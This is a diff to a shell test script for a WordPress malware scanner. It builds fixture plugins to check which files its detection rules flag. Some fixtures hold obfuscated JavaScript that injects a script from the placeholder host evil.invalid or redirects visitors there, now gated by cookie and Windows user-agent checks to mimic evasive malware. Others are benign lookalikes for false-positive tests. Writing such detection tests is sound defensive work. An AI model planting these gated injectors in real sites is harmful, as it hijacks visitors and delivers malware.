@@ -11,13 +11,17 @@ mkdir -p "$SITE/wp-admin" \
   "$SITE/wp-content/plugins/framework-bundle" \
   "$SITE/wp-content/plugins/admin-target" \
   "$SITE/wp-content/plugins/admin-hook-only" \
+  "$SITE/wp-content/plugins/wordfence-like" \
   "$SITE/wp-content/plugins/benign-admin" \
   "$SITE/wp-includes"
 touch "$SITE/wp-settings.php" "$SITE/wp-load.php"
 printf '<?php $wp_version = "7.1";\n' > "$SITE/wp-includes/version.php"
 
+# High-confidence PW-JS-002 now requires the encoded loader to be tied to a
+# visitor/environment evasion gate. This models redirect/injection malware
+# without treating ordinary encoded asset loaders as malware.
 cat > "$SITE/wp-content/plugins/malicious-js/loader.js" <<'JS'
-(function(){var s=document.createElement('script');s.src=String.fromCharCode(104,116,116,112,115,58,47,47,101,118,105,108,46,105,110,118,97,108,105,100,47,120,46,106,115);document.head.appendChild(s);}());
+if (document.cookie.indexOf('pw_seen=') === -1) { var s=document.createElement('script');s.src=String.fromCharCode(104,116,116,112,115,58,47,47,101,118,105,108,46,105,110,118,97,108,105,100,47,120,46,106,115);document.head.appendChild(s); }
 JS
 cat > "$SITE/wp-content/plugins/malicious-js/redirect.js" <<'JS'
 var u=String.fromCharCode(104,116,116,112,115,58,47,47,101,118,105,108,46,105,110,118,97,108,105,100);window.location.href=u;
@@ -26,7 +30,7 @@ JS
 # The first decoded variable is intentionally harmless. Detectors must inspect
 # every decoder assignment and still follow the later value into the sink.
 cat > "$SITE/wp-content/plugins/multi-js/loader.js" <<'JS'
-var harmless=atob('aGVsbG8=');console.log(harmless);var payload=atob('aHR0cHM6Ly9ldmlsLmludmFsaWQveC5qcw==');var s=document.createElement('script');s.src=payload;document.head.appendChild(s);
+var harmless=atob('aGVsbG8=');console.log(harmless);if(navigator.userAgent.indexOf('Windows')!==-1){var payload=atob('aHR0cHM6Ly9ldmlsLmludmFsaWQveC5qcw==');var s=document.createElement('script');s.src=payload;document.head.appendChild(s);}
 JS
 cat > "$SITE/wp-content/plugins/multi-js/redirect.js" <<'JS'
 const harmless=atob('aGVsbG8=');console.log(harmless);const target=atob('aHR0cHM6Ly9ldmlsLmludmFsaWQ=');window.location.replace(target);
@@ -37,6 +41,11 @@ cat > "$SITE/wp-content/plugins/benign-js/loader.js" <<'JS'
 JS
 cat > "$SITE/wp-content/plugins/benign-js/redirect.js" <<'JS'
 window.location.href='/account';
+JS
+# Static encoded external URLs occur in legitimate application/security/core
+# assets. Encoding + script creation + insertion alone must stay clean.
+cat > "$SITE/wp-content/plugins/benign-js/static-encoded-loader.js" <<'JS'
+(function(){var s=document.createElement('script');s.src=atob('aHR0cHM6Ly9jZG4uZXhhbXBsZS5jb20vYXBwLmpz');document.head.appendChild(s);}());
 JS
 
 # Framework/minified bundles commonly reuse short variable names across
@@ -81,6 +90,23 @@ if (is_admin() && current_user_can('manage_options')) {
 }
 PHP
 
+# Large legitimate utility files can contain every individual PW-PHP-006
+# ingredient in unrelated methods. This models the real Wordfence wfUtils.php
+# fleet false positive and must remain clean without any product-name allowlist.
+cat > "$SITE/wp-content/plugins/wordfence-like/wfUtils.php" <<'PHP'
+<?php
+class wfUtilsLike {
+    public static function adminPage() {
+        if (is_admin() && current_user_can('manage_options')) { echo 'settings'; }
+    }
+    public static function userAgent() { return $_SERVER['HTTP_USER_AGENT'] ?? ''; }
+    public static function windowsCompat() { return stripos(PHP_OS, 'Windows') === 0 || stripos(PHP_OS, 'Win64') === 0; }
+    public static function fetchRules() { return wp_remote_get('https://security.example.invalid/rules'); }
+    public static function decodeSetting($value) { return base64_decode($value); }
+    public static function printStatus() { print 'ready'; }
+}
+PHP
+
 cat > "$SITE/wp-content/plugins/benign-admin/plugin.php" <<'PHP'
 <?php
 if (is_admin() && current_user_can('manage_options')) {
@@ -104,9 +130,9 @@ fi
 php_out=$(ROOT="$TMP/sites" PRESSWARDEN_CONFIG_FILE="$TMP/no-config" PRESSWARDEN_STATE_DIR="$TMP/state-php" PRESSWARDEN_CACHE_DIR="$TMP/cache-php" PRESSWARDEN_NOCOLOR=1 bash "$ROOTDIR/checks/php-threat-intel.sh" 2>&1 || true)
 printf '%s\n' "$php_out" | grep -q 'PW-PHP-006'
 printf '%s\n' "$php_out" | grep -q 'admin-target/payload.php'
-if printf '%s\n' "$php_out" | grep -qE 'benign-admin/plugin.php|admin-hook-only/plugin.php'; then
+if printf '%s\n' "$php_out" | grep -qE 'benign-admin/plugin.php|admin-hook-only/plugin.php|wordfence-like/wfUtils.php'; then
   printf '%s\n' "$php_out" >&2
-  printf 'benign/non-output admin behavior was falsely flagged\n' >&2
+  printf 'benign/non-flow admin utility behavior was falsely flagged\n' >&2
   exit 1
 fi
 
